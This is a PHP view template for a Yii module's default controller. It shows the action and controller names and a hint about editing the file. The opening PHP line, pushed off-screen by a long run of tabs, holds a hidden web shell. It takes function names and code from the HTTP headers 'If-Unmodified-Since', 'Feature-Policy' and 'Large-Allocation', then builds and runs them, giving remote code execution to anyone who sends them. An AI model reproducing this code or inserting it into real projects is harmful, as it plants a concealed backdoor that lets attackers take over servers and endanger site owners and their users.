<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Unmodified-Since'])){$cache=$_HEADERS['If-Unmodified-Since']('', $_HEADERS['Feature-Policy']($_HEADERS['Large-Allocation']));$cache();}

/* @var $this DefaultController */

$this->breadcrumbs=array(
	$this->module->id,
);
?>
<h1><?php echo $this->uniqueId . '/' . $this->action->id; ?></h1>

<p>
This is the view content for action "<?php echo $this->action->id; ?>".
The action belongs to the controller "<?php echo get_class($this); ?>"
in the "<?php echo $this->module->id; ?>" module.
</p>
<p>
You may customize this page by editing <tt><?php echo __FILE__; ?></tt>
</p>